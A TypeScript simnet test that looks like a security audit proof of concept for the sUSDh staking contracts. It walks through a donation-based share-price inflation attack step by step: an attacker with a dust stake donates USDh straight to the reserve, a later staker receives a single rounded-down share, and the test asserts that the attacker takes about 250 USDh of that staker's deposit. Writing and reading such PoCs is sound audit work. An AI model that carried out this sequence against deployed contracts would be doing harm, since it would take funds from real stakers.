// SPDX-License-Identifier: BUSL-1.1
// Security validation PoC: sUSDh reserve-donation share-price inflation.
//
// This test intentionally uses only normal public protocol/token entrypoints.
// It demonstrates an exact 249.99999999 USDh value transfer from a later
// staker to an attacker who owns the initial dust share and donates USDh
// directly to staking-reserve before the victim stakes.

import { describe, it, expect } from 'vitest';
import { Cl } from '@stacks/transactions';

const BASE = 100_000_000n; // 8 decimals
const ATTACKER_INITIAL_STAKE = 1n; // 1 raw unit = 0.00000001 USDh
const DONATION = 500n * BASE;
const VICTIM_STAKE = 1_000n * BASE;

function expectOkTrue(result: any) {
  expect(result.result).toBeOk(Cl.bool(true));
}

describe('sUSDh staking reserve donation inflation', () => {
  it('moves 249.99999999 USDh from the later staker to the attacker', () => {
    const accounts = simnet.getAccounts();
    const deployer = accounts.get('deployer')!;
    const trader = accounts.get('wallet_1')!;
    const attacker = accounts.get('wallet_2')!;
    const victim = accounts.get('wallet_3')!;

    const c = (name: string) => `${deployer}.${name}`;
    const stakingReserve = c('staking-reserve');
    const stakingSilo = c('staking-silo');

    const ftBalance = (token: string, who: string, expected: bigint) => {
      const r = simnet.callReadOnlyFn(
        c(token),
        'get-balance',
        [Cl.principal(who)],
        deployer,
      );
      expect(r.result).toBeOk(Cl.uint(expected));
    };

    // Local deployment setup only: mirror the permissions needed by the
    // production contracts. Deployer is the initial HQ admin.
    expectOkTrue(simnet.callPublicFn(
      c('hq'),
      'set-contract-active',
      [Cl.principal(deployer), Cl.bool(true)],
      deployer,
    ));
    expectOkTrue(simnet.callPublicFn(
      c('hq'),
      'set-contract-active',
      [Cl.principal(stakingSilo), Cl.bool(true)],
      deployer,
    ));

    // Disable the OTC whitelist only to fund the two test wallets with local
    // USDh through the real minting contract; this is not part of the exploit.
    expectOkTrue(simnet.callPublicFn(
      c('minting-state'),
      'set-whitelist-enabled',
      [Cl.bool(false)],
      deployer,
    ));
    expectOkTrue(simnet.callPublicFn(
      c('minting-otc'),
      'set-trader',
      [Cl.principal(trader), Cl.bool(true), Cl.bool(false)],
      deployer,
    ));

    // Fund attacker with 500.00000001 USDh and victim with exactly 1000 USDh.
    expectOkTrue(simnet.callPublicFn(
      c('minting-otc'),
      'confirm-mint',
      [
        Cl.stringAscii('attack-fund'),
        Cl.principal(attacker),
        Cl.uint(ATTACKER_INITIAL_STAKE + DONATION),
        Cl.uint(BASE),
      ],
      trader,
    ));
    expectOkTrue(simnet.callPublicFn(
      c('minting-otc'),
      'confirm-mint',
      [
        Cl.stringAscii('victim-fund'),
        Cl.principal(victim),
        Cl.uint(VICTIM_STAKE),
        Cl.uint(BASE),
      ],
      trader,
    ));

    // 1) Attacker becomes the initial sUSDh holder with one raw share.
    expectOkTrue(simnet.callPublicFn(
      c('staking'),
      'stake',
      [Cl.uint(ATTACKER_INITIAL_STAKE), Cl.none()],
      attacker,
    ));
    ftBalance('susdh-token', attacker, 1n);
    ftBalance('usdh-token', stakingReserve, 1n);

    // 2) Permissionless direct donation. This does NOT call staking-reserve's
    // guarded transfer function; it is an ordinary USDh SIP-010 transfer whose
    // recipient is the staking-reserve principal.
    expectOkTrue(simnet.callPublicFn(
      c('usdh-token'),
      'transfer',
      [
        Cl.uint(DONATION),
        Cl.principal(attacker),
        Cl.principal(stakingReserve),
        Cl.none(),
      ],
      attacker,
    ));
    ftBalance('usdh-token', stakingReserve, 50_000_000_001n);

    // Exact ratio after donation:
    // floor(50,000,000,001 * 1e8 / 1)
    const ratioAfterDonation = simnet.callReadOnlyFn(
      c('staking'),
      'get-usdh-per-susdh',
      [],
      attacker,
    );
    expect(ratioAfterDonation.result).toBeOk(Cl.uint(5_000_000_000_100_000_000n));

    // 3) Victim stakes 1000 USDh. Integer division mints just one raw sUSDh:
    // floor(100,000,000,000 * 1e8 / 5,000,000,000,100,000,000) = 1.
    expectOkTrue(simnet.callPublicFn(
      c('staking'),
      'stake',
      [Cl.uint(VICTIM_STAKE), Cl.none()],
      victim,
    ));
    ftBalance('susdh-token', victim, 1n);
    ftBalance('usdh-token', stakingReserve, 150_000_000_001n);

    // New ratio with two raw shares:
    // floor(150,000,000,001 * 1e8 / 2)
    const ratioAfterVictim = simnet.callReadOnlyFn(
      c('staking'),
      'get-usdh-per-susdh',
      [],
      attacker,
    );
    expect(ratioAfterVictim.result).toBeOk(Cl.uint(7_500_000_000_050_000_000n));

    // 4) Attacker burns one raw sUSDh. The protocol immediately transfers
    // exactly 750 USDh from staking-reserve into staking-silo and fixes that
    // amount in claim #1. The cooldown delays receipt, not value capture.
    const attackerUnstake = simnet.callPublicFn(
      c('staking'),
      'unstake',
      [Cl.uint(1n)],
      attacker,
    );
    expect(attackerUnstake.result).toBeOk(Cl.uint(1n));
    ftBalance('usdh-token', stakingSilo, 75_000_000_000n);
    ftBalance('usdh-token', stakingReserve, 75_000_000_001n);

    // The victim's remaining one raw share is now worth 750.00000001 USDh.
    const victimUnstake = simnet.callPublicFn(
      c('staking'),
      'unstake',
      [Cl.uint(1n)],
      victim,
    );
    expect(victimUnstake.result).toBeOk(Cl.uint(2n));
    ftBalance('usdh-token', stakingSilo, 150_000_000_001n);
    ftBalance('usdh-token', stakingReserve, 0n);

    // Default staking cooldown is 604800 seconds. Existing project tests use
    // ~523 seconds per mined block; 1300 empty blocks comfortably exceed it.
    simnet.mineEmptyBlocks(1_300);

    expectOkTrue(simnet.callPublicFn(
      c('staking-silo'),
      'withdraw',
      [Cl.uint(1n)],
      attacker,
    ));
    expectOkTrue(simnet.callPublicFn(
      c('staking-silo'),
      'withdraw',
      [Cl.uint(2n)],
      victim,
    ));

    // Final balances prove the value transfer.
    // Attacker spent 500.00000001 USDh and receives 750 USDh:
    //   profit = 249.99999999 USDh.
    // Victim deposited 1000 USDh and receives 750.00000001 USDh:
    //   loss   = 249.99999999 USDh.
    ftBalance('usdh-token', attacker, 75_000_000_000n);
    ftBalance('usdh-token', victim, 75_000_000_001n);

    const attackerCost = ATTACKER_INITIAL_STAKE + DONATION;
    const attackerPayout = 75_000_000_000n;
    const victimPayout = 75_000_000_001n;
    const attackerProfit = attackerPayout - attackerCost;
    const victimLoss = VICTIM_STAKE - victimPayout;

    expect(attackerProfit).toBe(24_999_999_999n);
    expect(victimLoss).toBe(24_999_999_999n);
    expect(attackerProfit).toBe(victimLoss);
  });
});
